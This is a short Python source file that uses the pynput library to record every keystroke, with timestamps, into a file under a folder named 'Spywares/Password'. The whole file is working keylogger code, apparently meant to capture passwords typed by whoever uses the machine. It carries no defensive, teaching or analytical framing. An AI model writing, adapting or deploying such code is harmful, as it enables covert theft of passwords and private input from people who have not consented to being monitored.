from pynput.keyboard import Key, Listener
import logging


def KeyL():
    logging.basicConfig(filename=("Spywares/Password/keySpy.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
    
    def on_press(key):
        logging.info(str(key))
    
    with Listener(on_press=on_press) as listener :
        listener.join()

def quit_on_clc():
    quit()